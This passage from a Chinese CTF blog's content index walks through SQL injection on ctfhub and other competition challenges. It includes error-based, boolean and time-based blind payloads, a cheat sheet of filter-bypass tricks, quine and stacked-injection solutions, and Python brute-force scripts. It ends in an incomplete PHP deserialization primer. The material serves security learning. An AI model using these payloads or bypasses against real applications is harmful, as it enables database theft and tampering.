table_schema=\"sqli\"),0x7e),1)\n```\n\n![image-20230714202632846](https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20230714202632846-1691289107544-5.png)\n\n查询到表名：flag 进而查询列名：\n\n```sql\n1 union select updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=\"flag\"),0x7e),1)\n```\n\n![image-20230714202802542](https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20230714202802542-1691289107543-1.png)\n\n最后查询 列名为 flag 的信息\n\n```sql\n1 union select updatexml(1,concat(0x7e,(select flag from flag),0x7e),1)\n```\n\n![image-20230714202857595](https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20230714202857595-1691289107544-3.png)\n\n### 例题2：布尔盲注(ctfhub)\n\n> 1. `substr(str,from,length)`:返回从下标为from截取长度为length的str子串。**其中，首字符下标为1**\n> 2. `length(str)`:返回str串长度\n\n\n\n**1. 首先  `` 爆数据库名长度`` 使用`` length(database()) = i `` 获取数据库名的长度**\n\n```sql\n1 and length(database())=1\n......\n1 and length(database())=4\n```\n\n![image-20230714210008799](https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20230714210008799.png)\n\n**2. 根据数据库名长度爆库名 使用 ` substr(database(),i,1)`**\n\n```sql\n?id=1 and substr(database(),1,1)=‘a’\n#query_error\n...\n?id=1 and substr(database(),1,1)=‘s’\n#query_success\n#库名第一个字符是s\n...\n?id=1 and substr(database(),4,1)=‘i’\n#query_success\n#库名第四个字符是i\n\n#库名是sqli\n```\n\n![image-20230714210628752](https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20230714210628752.png)\n\n**3. 获取数据库内的表数量，使用mysql的查询语句`select COUNT(*)`。同样，要一个1到无穷的循环**\n\n```sql\n?id=1 and (select COUNT(*) from information_schema.tables where table_schema=database())=1\n#query_error\n\n?id=1 and (select COUNT(*) from information_schema.tables where table_schema=database())=2\n#query_success\n#当前库sqli有2张表\n```\n\n![image-20230714211308430](https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20230714211308430.png)\n\n**4. 使用`limit i ,1`限定是第几张表，内嵌循环j从1到无穷（穷举所有表名长度可能性）尝试获取每个表的表名长度**\n\n```sql\n?id=1 and length(select table_name from information_schema.tables where table_schema=database() limit 0,1)=1\n#query_error\n...\n?id=1 and length(select table_name from information_schema.tables where table_schema=database() limit 0,1)=4\n#query_success\n#当前库sqli的第一张表表名长度为4\n...\n?id=1 and length(select table_name from information_schema.tables where table_schema=database() limit 1,1)=4\n#query_success\n#当前库sqli的第二张表表名长度为4\n\n#当前库sqli有两张表’news’和’flag‘，表名长度均为4\n```\n\n\n\n表名长度爆表名`substr((select…limit i,1),j,1)`\n\n```sql\n?id=1 and substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1)='a'\n#query_error\n...\n?id=1 and substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1)='n'\n#query_success\n#当前库sqli的第一张表表名第一个字符是n\n...\n?id=1 and substr((select table_name from information_schema.tables where table_schema=database() limit 1,1),4,1)='g'\n#query_success\n#当前库sqli的第二张表表名的第四个字符是g\n\n#当前库sqli有两张表’news‘和‘flag’\n```\n\n6. 对表爆列数量\n\n```sql\n?id=1 and (select COUNT(*) from information_schema.columns where table_schema=database() and table_name='flag')=1\n#query_error\n\n?id=1 and (select COUNT(*) from information_schema.columns where table_schema=database() and table_name='flag')=2\n#query_success\n#当前库sqli表flag的列数为2\n```\n\n7. 根据表名和列数量爆列名长度\n\n```sql\n?id=1 and length(select columns from information_schema.columns where table_schema=database() and table_name='flag' limit 0,1)=1\n#query_error\n...\n?id=1 and length(select columns from information_schema.columns where table_schema=database() and table_name='flag' limit 0,1)=4\n#query_success\n#当前库sqli表flag的第一列列名长度为4\n...\n?id=1 and length(select columns from information_schema.columns where table_schema=database() and table_name='flag' limit 0,1)=4\n#query_success\n#当前库sqli表flag的第二列列名长度为4\n\n#当前库sqli表flag有两个列‘id’和‘flag’，列名长度为2和4\n\n```\n\n8. 根据列名长度爆列名\n\n```sql\n?id=1 and substr((select columns_name from information_schema.columns where table_schema=database() and table_name='flag' limit 0,1),1,1)='a'\n#query_error\n...\n?id=1 and substr((select columns_name from information_schema.columns where table_schema=database() and table_name='flag' limit 0,1),1,1)='i'\n#query_success\n#当前库sqli表flag的第一列列名第一个字符为i\n...\n?id=1 and substr((select columns_name from information_schema.columns where table_schema=database() and table_name='flag' limit 1,1),4,1)='g'\n#query_success\n#当前库sqli表flag的第二列列名第四个字符为g\n\n#当前库sqli表flag有两个列‘id’和‘flag’\n```\n\n9. 根据列名爆数据\n\n```sql\n?id=1 and substr((select flag from sqli.flag),1，1)=“a”\n#query_error\n...\n?id=1 and substr((select flag from sqli.flag),1，1)=“c”\n#query_success\n#flag的第一个字符是c\n...\n?id=1 and substr((select flag from sqli.flag),i，1)=“}”\n#query_success\n#flag的最后一个字符是}\n#这里的j是计数变量j从1自增1得到的值\n\n#出循环即可得到flag\n```\n\n### 例题3：时间盲注(ctfhub)\n\n时间盲注和上一篇布尔盲注一样都是盲注，都需要借助`length`,`ascii`,`substr`这些神奇的函数来猜测各项信息。它们的差别是猜测成功的依据。\n\n布尔盲注的话如果查询有结果，一般会有一个`success_flag`,比如在上一题里就会返回`query successfully`。\n\n但是时间盲注不一样，它不光不给你查询的内容的回显，不给你报错信息，甚至连布尔盲注里的`success_flag`也不给。\n时间盲注相当于自行创造出了一个`success_flag`，将查询成功的情况与查询失败的情况做了区分。\n\n> `substr(str,from,length)`:返回从下标为from截取长度为length的str子串。**其中，首字符下标为1**\n\n1. 首先爆破数据库长度\n\n```sql\n1 and if(length(database())=4,sleep(3),1)\n```\n\n![image-20230717201555815](https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20230717201555815.png)\n\n2.  爆破数据库名字 \n\n```sql\n1 and if(ascii(substr(database(),1,1))>110,sleep(3),1)\n1 and if(ascii(substr(database(),1,1))=115,sleep(3),1)\tascii(s)=115\n\n1 and if(ascii(substr(database(),2,1))>110,sleep(3),1)\n1 and if(ascii(substr(database(),2,1))=113,sleep(3),1)\tascii(q)=113\n\n1 and if(ascii(substr(database(),3,1))>110,sleep(3),1)\n1 and if(ascii(substr(database(),3,1))=108,sleep(3),1)\tascii(l)=108\n\n1 and if(ascii(substr(database(),4,1))>110,sleep(3),1)\n1 and if(ascii(substr(database(),4,1))=105,sleep(3),1)\tascii(i)=105\n\n......\n不断调整ASCII码的范围逐渐得到数据库名称为sqli\n```\n\n![image-20230717201850243](https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20230717201850243.png)\n\n3. 爆破数据库中表的数量\n\n```sql\n1 and if((select count(table_name) from information_schema.tables where table_schema=database())=2,sleep(3),1)\n```\n\n![image-20230717202031447](https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20230717202031447.png)\n\n4. 爆破数据库中的各表名\n\n```sql\n1 and if(ascii(substr((select table_name from information_schema.tables\n  where table_schema=database() limit 0,1),1,1))=110,sleep(3),1)\n  ascii(n)=110\n\n3秒后响应，说明第一张表的第一个字母为n\n依次得到表名为news\nlimit i,1  i 表示的即是第几张表\n\n1 and if(ascii(substr((select table_name from information_schema.tables\n  where table_schema=database() limit 1,1),1,1))=102,sleep(3),1)\n  ascii(f)=102\n\n3秒后响应，说明第二张表的第一个字母为f\n依次得到表名为flag\n```\n\n![image-20230717202404932](https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20230717202404932.png)\n\n5. 爆破flag表的字段数\n\n```sql\n1 and if((select count(column_name) from information_schema.columns where table_name='flag')=1,sleep(3),1)\n```\n\n6. 猜解字段名 \n\n```sql\n1 and if(ascii(substr((select column_name from information_schema.columns where table_name='flag'),1,1))=102,sleep(3),1)\n\n一样的套路，得到字段名为flag\n```\n\n","tags":["手工注入","报错注入","布尔盲注","时间盲注","ctfhub"],"categories":["Web"]},{"title":"sql注入绕过技巧","url":"/sql注入绕过技巧/","content":"\n# sql注入绕过技巧\n\n## 1.绕过空格（注释符/* */，%a0）：\n\n　　`两个空格代替一个空格，用Tab代替空格，%a0=空格：`\n\n```sql\n%20 %09 %0a %0b %0c %0d %a0 %00 /**/  /*!*/\n```\n\n 最基本的绕过方法，用注释替换空格：\n\n```sql\n/*  注释 */\n```\n\n![image-20230719194920907](https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20230719194920907.png)\n\n使用浮点数：\n\n```sql\nselect * from users where id=8E0union select 1,2,3\nselect * from users where id=8.0 select 1,2,3\n```\n\n## 2.括号绕过空格：\n\n　　如果空格被过滤，括号没有被过滤，可以用括号绕过。\n\n　　在MySQL中，括号是用来包围子查询的。因此，任何可以计算出结果的语句，都可以用括号包围起来。而括号的两端，可以没有多余的空格。\n\n例如：\n\n```sql\nselect(user())from dual where(1=1)and(2=2)\n```\n\n　　这种过滤方法常常用于time based盲注,例如：\n\n```sql\n?id=1%27and(sleep(ascii(mid(database()from(1)for(1)))=109))%23\n```\n\n（from for属于逗号绕过下面会有）\n\n　　上面的方法既没有逗号也没有空格。猜解database（）第一个字符ascii码是否为109，若是则加载延时。\n\n## 3.引号绕过（使用十六进制）\n\n　　会使用到引号的地方一般是在最后的`where`子句中。如下面的一条sql语句，这条语句就是一个简单的用来查选得到users表中所有字段的一条语句：\n\n```sql\nselect column_name  from information_schema.tables where table_name=\"users\"\n```\n\n　　这个时候如果引号被过滤了，那么上面的`where`子句就无法使用了。那么遇到这样的问题就要使用**十六进制**来处理这个问题了。\n`　　users`的十六进制的字符串是`7573657273`。那么最后的sql语句就变为了：\n\n```sql\nselect column_name  from information_schema.tables where table_name=0x7573657273\n```\n\n## 4.逗号绕过（使用from或者offset）：\n\n　　在使用盲注的时候，需要使用到substr(),mid(),limit。这些子句方法都需要使用到逗号。对于substr()和mid()这两个方法可以使用`from to`的方式来解决：\n\n```sql\nselect substr(database() from 1 for 1);\nselect mid(database() from 1 for 1);\n```\n\n　　使用join：\n\n```sql\nunion select 1,2     #等价于\nunion select * from (select 1)a join (select 2)b\n```\n\n　　使用like：\n\n```sql\nselect ascii(mid(user(),1,1))=80   #等价于\nselect user() like 'r%'\n```\n\n　　对于`limit`可以使用`offset`来绕过：\n\n```sql\nselect * from news limit 0,1\n# 等价于下面这条SQL语句\nselect * from news limit 1 offset 0\n```\n\n## 5.比较符号（<>）绕过（过滤了<>：sqlmap盲注经常使用<>，使用between的脚本）：\n\n### 使用greatest()、least（）：（前者返回最大值，后者返回最小值）\n\n　同样是在使用盲注的时候，在使用二分查找的时候需要使用到比较操作符来进行查找。如果无法使用比较操作符，那么就需要使用到`greatest`来进行绕过了。\n　　最常见的一个盲注的sql语句：\n\n```sql\nselect * from users where id=1 and ascii(substr(database(),0,1))>64\n```\n\n　　此时如果比较操作符被过滤，上面的盲注语句则无法使用,那么就可以使用`greatest`来代替比较操作符了。greatest(n1,n2,n3,...)函数返回输入参数(n1,n2,n3,...)的最大值。\n　　那么上面的这条sql语句可以使用`greatest`变为如下的子句:\n\n```sql\nselect * from users where id=1 and greatest(ascii(substr(database(),0,1)),64)=64\n```\n\n### 使用between and： \n\n  between a and b：\n\nbetween 1 and 1; 等价于 =1\n\n## 6.or and xor not绕过：\n\n```sql\nand=&&  or=||   xor=|   not=!\n```\n\n## 7.绕过注释符号（#，--(后面跟一个空格））过滤：\n\n```sql\nid=1' union select 1,2,3||'1\n```\n\n　　最后的or '1闭合查询语句的最后的单引号，或者：\n\n```sql\nid=1' union select 1,2,'3\n```\n\n## 8.=绕过：\n\n　　使用like 、rlike 、regexp 或者 使用< 或者 >\n\n## 9.绕过union，select，where等：\n\n### （1）使用注释符绕过：\n\n　　常用注释符：\n\n```sql\n//，-- , /**/, #, --+, -- -, ;,%00,--a\n```\n\n　　用法：\n\n```sql\nU/**/ NION /**/ SE/**/ LECT /**/user，pwd from user\n```\n\n### （2）使用大小写绕过：\n\n```sql\nid=-1'UnIoN/**/SeLeCT\n```\n\n### （3）内联注释绕过：\n\n```sql\nid=-1'/*!UnIoN*/ SeLeCT 1,2,concat(/*!table_name*/) FrOM /*information_schema*/.tables /*!WHERE *//*!TaBlE_ScHeMa*/ like database()#\n```\n\n### （4） 双关键字绕过（若删除掉第一个匹配的union就能绕过）：\n\n```sql\nid=-1'UNIunionONSeLselectECT1,2,3–-\n```\n\n## 10.通用绕过（编码）：\n\n　　如URLEncode编码，ASCII,HEX,unicode编码绕过：\n\n```sql\nor 1=1即%6f%72%20%31%3d%31，而Test也可以为CHAR(101)+CHAR(97)+CHAR(115)+CHAR(116)。\n```\n\n## 11.等价函数绕过：\n\n```sql\nhex()、bin() ==> ascii()\n\nsleep() ==>benchmark()\n\nconcat_ws()==>group_concat()\n\nmid()、substr() ==> substring()\n\n@@user ==> user()\n\n@@datadir ==> datadir()\n\n举例：substring()和substr()无法使用时：?id=1+and+ascii(lower(mid((select+pwd+from+users+limit+1,1),1,1)))=74　\n\n或者：\nsubstr((select 'password'),1,1) = 0x70\nstrcmp(left('password',1), 0x69) = 1\nstrcmp(left('password',1), 0x70) = 0\nstrcmp(left('password',1), 0x71) = -1\n```\n\n## 12.宽字节注入：\n\n　　过滤 ' 的时候往往利用的思路是将 ' 转换为 \\' 。\n\n　　在 mysql 中使用 GBK 编码的时候，会认为两个字符为一个汉字，一般有两种思路：\n\n　　（1）%df 吃掉 \\ 具体的方法是 urlencode('\\) = %5c%27，我们在 %5c%27 前面添加 %df ，形成 %df%5c%27 ，而 mysql 在 GBK 编码方式的时候会将两个字节当做一个汉字，%df%5c 就是一个汉字，%27 作为一个单独的（'）符号在外面：\n\n```sql\nid=-1%df%27union select 1,user(),3--+\n```\n\n　　（2）将 \\' 中的 \\ 过滤掉，例如可以构造 %**%5c%5c%27 ，后面的 %5c 会被前面的 %5c 注释掉。\n\n### 一般产生宽字节注入的PHP函数：\n\n  1.replace（）：过滤 ' \\ ，将 ' 转化为 \\' ，将 \\  转为 \\\\，将 \" 转为 \\\" 。用思路一。\n\n  2.addslaches()：返回在预定义字符之前添加反斜杠（\\）的字符串。预定义字符：' , \" , \\ 。用思路一\n\n（防御此漏洞，要将 mysql_query 设置为 binary 的方式）\n\n　 　3.mysql_real_escape_string()：转义下列字符：\n\n```sql\n\\x00     \\n     \\r     \\     '     \"     \\x1a\n```\n\n（防御，将mysql设置为gbk即可）\n\n## PCRE绕过：\n\n```sql\nunion/*'+'a'*1000001+'*/select\n```\n\n# \n","tags":["sql注入","绕过"],"categories":["Web"]},{"title":"yet_another_mysql_injection","url":"/yet-another-mysql-injection/","content":"\n# 2021-第五空间智能安全大赛-Web-yet_another_mysql_injection\n\n1. 初始界面\n\n![image-20230801194529159](https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20230801194529159.png)\n\n查看源代码发现源码文件  **/?source**\n\n```php\n<?php\ninclude_once(\"lib.php\");\nfunction alertMes($mes,$url){\n    die(\"<script>alert('{$mes}');location.href='{$url}';</script>\");\n}\n\nfunction checkSql($s) {\n    if(preg_match(\"/regexp|between|in|flag|=|>|<|and|\\||right|left|reverse|update|extractvalue|floor|substr|&|;|\\\\\\$|0x|sleep|\\ /i\",$s)){\n        alertMes('hacker', 'index.php');\n    }\n}\n\nif (isset($_POST['username']) && $_POST['username'] != '' && isset($_POST['password']) && $_POST['password'] != '') {\n    $username=$_POST['username'];\n    $password=$_POST['password'];\n    if ($username !== 'admin') {\n        alertMes('only admin can login', 'index.php');\n    }\n    checkSql($password);\n    $sql=\"SELECT password FROM users WHERE username='admin' and password='$password';\";\n    $user_result=mysqli_query($con,$sql);\n    $row = mysqli_fetch_array($user_result);\n    if (!$row) {\n        alertMes(\"something wrong\",'index.php');\n    }\n    if ($row['password'] === $password) {\n    die($FLAG);\n    } else {\n    alertMes(\"wrong password\",'index.php');\n  }\n}\n\nif(isset($_GET['source'])){\n  show_source(__FILE__);\n  die;\n}\n?>\n```\n\n2. 源码分析\n\n- `alertMes($mes, $url)`：该函数接受两个参数，`$mes`（要显示的消息）和`$url`（显示消息后要重定向的URL）。它使用JavaScript输出一个包含给定消息的警告弹窗，然后将用户重定向到指定的URL。\n- `checkSql($s)`：该函数接受一个参数`$s`（一个字符串），并检查其中是否包含任何可疑的SQL关键词或字符，这可能表明试图进行SQL注入攻击。如果发现任何可疑关键词或字符，它将使用`alertMes`函数显示警告，并将用户重定向到 \"index.php\"。\n\n\n\n```php\nfunction checkSql($s) {\n    if(preg_match(\"/regexp|between|in|flag| =| >|< |and|\\||right|left|reverse|update|extractvalue|floor|substr|&|;|\\\\\\$|0x|sleep|\\ /i\",$s)){\n        alertMes('hacker', 'index.php');\n    }\n}\n```\n\n- 模式分隔符后的\"i\"标记这是一个大小写不敏感的搜索\n\n```bash\nsleep 可以用benchmark代替\n<,> 可以用least(),greatest()代替\n=,in 可以用like代替\nsubstr 可以用mid代替\n空格 可以用/**/代替\n```\n\n3. 注入脚本测试\n\n```python\nimport requests\nimport time\n\nchar = '01234567890abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ/*-+?~#!@&%'\n\n\ndef password():\n    flag = ''\n    url = 'http://challenge-f48e2f483110ea2f.sandbox.ctfhub.com:10800/index.php'\n    while True:\n        for i in char:\n            payload = {\"username\": \"admin\",\n                       \"password\": f\"1'or/**/password/**/like/**/'{flag + i}%'#\"\n                       }\n            # print(payload)\n            res = requests.post(url=url, data=payload)\n\n            if \"something wrong\" not in res.text:\n                flag += i\n                print(flag)\n                break\n            if \"ctfhub\" in res.text:\n                print(\"game over\")\n                break\n            elif \"~\" in i:\n                print(\"just ok\")\n                return\n\n\nif __name__ == '__main__':\n    password()\n\n```\n\n**运行结果 `o2cqmlyo0kpjkdyocm8cfbygzaievxbw       just ok`**\n\n通过`用户名 admin` `密码 o2cqmlyo0kpjkdyocm8cfbygzaievxbw` 登录 还是显示错误 \n\n4. 通过网上writeup 发现\n\n使用了 **quine注入**\n\n**1.首先先了解一下replace()函数**\n\n- replace(object,search,replace)\n- 把object对象中出现的的search全部替换成replace\n\n注入的payload:\n\n```sql\n1'/**/union/**/select/**/\nreplace(replace('1\"/**/union/**/select/**/replace(replace(\".\",char(34),char(39)),char(46),\".\")#',char(34),char(39)),char(46),'1\"/**/union/**/select/**/replace(replace(\".\",char(34),char(39)),char(46),\".\")#')#\n```\n\n`CHAR(34)=\"       CHAR(39)='        CHAR(33)=!         char(46)=.`\n\n## quine注入\n\n> 核心思想：\n>\n> sql语句执行的结果等于sql语句本身\n\n即利用sql执行的结果等于它本身绕过判断：\n\n$row['password'] === $password\n\n```sql\n1' union select replace(replace('1\" union select replace(replace(\".\",\",') ,., \".\")#',\", '), ., '1 union select replace(replace(\".\", \",'), ., \".\")#')#\n```\n\n","tags":["web","sql注入"],"categories":["CTF","ctfhub"]},{"title":"find_it","url":"/find-it/","content":"\n# 2021-第四届红帽杯网络安全大赛-Web-find_it\n\n![image-20230730102906291](https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20230730102906291-1691288556204-1.png)\n\n1. 首先进项端口扫描`dirsearch`\n\n![image-20230730103550756](https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20230730103550756-1691288556205-2.png)\n\n![image-20230730103615203](https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20230730103615203-1691288556205-3.png)\n\n1. robots.txt 文件内容\n\n![image-20230730103720699](https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20230730103720699-1691288556205-4.png)\n\n1. 1ndexx.php 打开404 ，尝试打开备份文件`.1ndexx.php.swp`\n\n![image-20230730103951694](https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20230730103951694-1691288556205-5.png)\n\n1. 查看源代码\n\n![image-20230730105041270](https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20230730105041270-1691288556205-6.png)\n\n1. 直接访问[hack](https://so.csdn.net/so/search?q=hack&spm=1001.2101.3001.7020).php无法访问 `show_source()`读取文件：\n\n```\n ?code=<?php show_source(__FILE__);?>\n```\n\n- `http://challenge-e1e88976b18bb969.sandbox.ctfhub.com:10800/index.php?code=<?php show_source(__FILE__);?>`\n- `http://challenge-e1e88976b18bb969.sandbox.ctfhub.com:10800/hack.php`\n\n![image-20230730105401597](https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20230730105401597-1691288556205-7.png)\n\n#### 关于show_source()\n\n```\n show_source() 函数对文件进行语法高亮显示。\n 本函数是 highlight_file() 的别名\n 12\n```\n\n#### 关于.swp缓存文件\n\n文件泄露(.swp备份文件):非正常关闭vi/[vim编辑器](https://so.csdn.net/so/search?q=vim编辑器&spm=1001.2101.3001.7020)时会生成一个.swp文件 \n\n```\n 调用这类的隐藏文件的时候，需要在最前面加.\n```\n\n#### 官方WriteUp\n\n[find_it | CTFHub](https://writeup.ctfhub.com/Challenge/2021/第四届红帽杯网络安全大赛/Web/oKTHZCKnTRgZzifYg5twqZ.html)\n","tags":["web","备份文件泄露"],"categories":["CTF","ctfhub"]},{"title":"随便注 1","url":"/随便注-1/","content":"\n### 强网杯2019-随便注\n\n1，测试` 1' or 1=1 # `,初步判定存在SQL注入。\n\n```sql\n1' or 1=1 #\n```\n\n再测试字段数，到3时报错，说明字段数为2.\n\n```sql\n1' order by 1 # \n```\n\n接着尝试union注入,回显了过滤的关键字。\n\n```sql\n1' union select 1,2#\n```\n\n![image-20230726152210746](https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20230726152210746.png)\n\n然后就是今天学会的新姿势“堆叠注入”了。\n原理很简单，就是通过 ; 号注入多条SQL语句。\n先通过show databases爆出数据库。\n\n```sql\n0'; show databases; #\n```\n\n然后用 show tables 尝试爆表。\n\n```sql\n0'; show tables; #\n```\n\n可以看到这里有两个表，我们先尝试爆words表的内容。\n\n```sql\n1'; show columns from words; #\n```\n\n表名为数字时，要用反引号包起来查询。\n\n```sql\n0'; show columns from `1919810931114514 `; #\n```\n\n1，通过 rename 先把 words 表改名为其他的表名。\n\n2，把 1919810931114514 表的名字改为 words 。\n\n3 ，给新 words 表添加新的列名 id 。\n\n4，将 flag 改名为 data 。\n\n```sql\n1'; rename table words to word1; rename table `1919810931114514` to words;alter table words add id    int unsigned not Null auto_increment primary key; alter table words change flag data varchar(100);#\n```\n\n\n\n","tags":["sql注入","buuctf"],"categories":["CTF","BUUCTF"]},{"title":"WebsiteManger","url":"/WebsiteManger/","content":"\n# 2021-第四届红帽杯网络安全大赛-Web-WebsiteManger\n\n![image-20230729200208646](https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20230729200208646.png)\n\n1. 首先f12检查源文件 发现图片可能存在注入点 ：\n\n![image-20230729200355574](https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20230729200355574.png)\n\n**布尔盲注知识点**\n\n- /image.php?id=if(1=1,1,5)              True\n- /image.php?id=if(1=2,1,5)              False\n\n`解释: 条件为真时?id=1，回显第一张图片，条件为假时?id=5，没有id=5的图片，什么都没有。即可作为布尔盲注判断条件`\n\n2. 脚本测试：\n\n```python\nimport requests\n\nall_str = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!\"#$%&\\'()*+,-./:;<=>?@[\\]^_`{|}~'\nurl = 'http://challenge-ebd076868bb77c54.sandbox.ctfhub.com:10800/image.php'\ninfo = ''\n\nfor i in range(1, 50):\n    for s in all_str:\n        payload = '?id=if((ascii(mid(database(),{},1))={}),1,5)'.format(i, ord(s))\n        ans = requests.get(url=url + payload)\n        if len(ans.text) > 1000:\n            info += s\n            print(payload)\n            print(info)\n```\n\n以上判断出`database()=ctf`\n\n![image-20230729200757857](https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20230729200757857.png)\n\n3. 根据网上writeup清晰得知：\n\n```python\n#爆破数据库\npayload = '?id=if((ascii(mid(database(),{},1))={}),1,5)'.format(i,ord(s))\n#爆破表名\npayload = '?id=if(ascii(mid((select/**/group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema=\\'ctf\\'),{},1))={},1,5)'.format(i,ord(s))\n#爆破列名\npayload = '?id=if(ascii(mid((select/**/group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_name=\\'users\\'),{},1))={},1,5)'.format(i,ord(s))\n#爆破字段\npayload = '?id=if(ascii(mid((select/**/group_concat(username,password)/**/from/**/ctf.users),{},1))={},1,5)'.format(i,ord(s))\n这里在做题的时候，发现爆破字段得到的结果不是ctf下的users的字段，因为没有加ctf这个限制，应该是爆破到了其他数据库下的users中的字段，需要加上数据库名ctf的限制条件，不过这里题目有对 ‘and’关键字过滤，所以需要用‘&&’替换，而且还要编码为ulr格式‘%26%26’，这里也是用brupsuit抓包分析了很久才发现的，不过只要有耐心，最终还是会发现。\n修改后的payload\npayload = '?id=if(ascii(mid((select/**/group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_name=\\'users\\'/**/%26%26/**/table_schema=database()),{},1))={},1,5)'.format(i, ord(s))\n```\n\n- 关键函数解释\n  - mid() 函数：截取字符串一部分，mid(column_name,start[,length])\n  - ord() 函数：是 chr() 函数（对于8位的ASCII字符串），它以一个字符（长度为1的字符串）作为参数，返回对应的 ASCII 数值。返回值是对应的十进制整数。\n  - group_concat() 函数：连接一个组的所有字符串，并以逗号分隔每一条数据。能一次性查出所有信息。group_concat(str1,str2,…)\n\n4. 最后得知的信息\n\n```python\nTables_in_ctf: users,images\n\nColumns_in_users: USER,CURRENT_CONNECTIONS,TOTAL_CONNECTIONS,id,username,password(此处与writeup有出入)\n\nvalues_in_users: adminf5b86501931f812ed3833dee67a43603\n\t\t\t\t adminc6ef523a171bb9a25f4115044b507d69\n```\n\n![image-20230729202534279](https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20230729202534279.png)\n\n5. 登录成功后\n\n![image-20230729204501099](https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20230729204501099.png)\n\n此处测试发现有ssrf漏洞 `输出127.0.0.1后反馈信息出现了(curl)`\n\n![image-20230729204645428](https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20230729204645428.png)\n\n抓包得到flag\n\n![image-20230729204429740](https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20230729204429740.png)\n\n#### 官方注入脚本 \n\n```python\nimport requests\nimport string\n\ncharset = \",@\"+ string.digits + string.ascii_lowercase + string.ascii_uppercase\n\ndef r(s):\n    s = s.replace(\" \", \"/**/\")\n    return s\n\nsql = r(\"select concat(id,username,password) from users\")\nresult = \"\"\nfor i in range(1,50):\n    for c in charset:\n        cc = ord(c)\n        url = f\"http://challenge-ebd076868bb77c54.sandbox.ctfhub.com:10800/image.php?id=-1/**/or/**/(ascii(mid(({sql}),{i},1))={cc})\"\n        r = requests.get(url)\n        if len(r.text) > 1024:\n            result += c\n            print(result)\n            break\n```\n\n![image-20230729204144756](https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20230729204144756.png)\n","tags":["web","sql注入","ssrf"],"categories":["CTF","ctfhub"]},{"title":"反序列化","url":"/反序列化/","content":"\n# 反序列化\n\n## PHP 反序列化\n\n### serialize()\n\nserialize() ---> 函数用于序列化对象或数组，并返回一个字符串\n\n```php\n<?php\nClass test{\n  public $a= '1';\n  public $bb= 2;\n  public $ccc= True;\n}\n\n$r= new test();\nechoserialize($r);\n\n$array_t= array(\"a\"=>\"1\",\"bb\"=>\"2\",\"ccc\"=>\"3\");\necho serialize($array_t);\n```\n\n> O:4:\"test\":3:{s:1:\"a\";s:1:\"1\";s:2:\"bb\";i:2;s:3:\"ccc\";b:1;}\n> a:3:\n\n各个字符的意义 ---> `第一个字母O 代表 Object，a代表 array，s代表 string，,i表示数字`\n\n![img](https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/640)\n**类的属性有三种 private protected 和 public**\n\nPHP 序列化的时候 **private**和 **protected** 变量会引入不可见字符`%00`，`%00类名%00属性名` 为private，`%00*%00属性名` 为protected，注意这两个 **%00**就是 ascii 码为0 的字符。这个字符显示和输出可能看不到，甚至导致截断，但是url编码后就可以看得清楚\n\n```php\n<?php\nClass test{\n  private $a= \"a\";\n  protected $b= \"b\";\n  public $c= \"c\";\n}\n\n$r= new test();\necho serialize($r);\necho urlencode(serialize($r));\n```\n\n> O:4:\"test\":3:{s:7:\"testa\";s:1:\"a\";s:4:\"*b\";s:1:\"b\";s:1:\"c\";s:1:\"c\";}\n>\n> O%3A4%3A%22test%22%3A3%3A%7Bs%3A7%3A%22%00test%00a%22%3Bs%3A1%3A%22a%22%3Bs%3A4%3A%22%00%2A%00b%22%3Bs%3A1%3A%22b%22%3Bs%3A1%3A%22c%22%3Bs%3A1%3A%22c%22%3B%7D\n\n### unserialize()\n\nunserialize() ---> 函数用于将通过 serialize()函数序列化后的对象或数组进行反序列化，并返回原始的对象结构\n\n```php\n<?php\n$sites = array('t1', 'tt2', 'ttt3');\n$serialized_data = serialize($sites);\n#echo  $serialized_data;\n$unserialized_data = unserialize($serialized_data);\nprint_r($unserialized_data);\n?>\n```\n\n> Array\n> (\n> ​ [0] => t1\n> ​ [1] => tt2\n> ​ [2] => ttt3\n> )\n\n### 常用魔法函数\n\n| 常用魔法函数  |                             定义                             |\n| :------------ | :----------------------------------------------------------: |\n| __construct() | 在创建对象时候初始化对象，一般用于对变量赋初值。创建一个新的类时，自动调用该方法 |\n| __destruct()  | 和构造函数相反，当对象所在函数调用完毕后执行.即当一个类被销毁时自动调用该方法 |\n| __toString()  |              当对象被当做一个字符串使用时调用。              |\n| 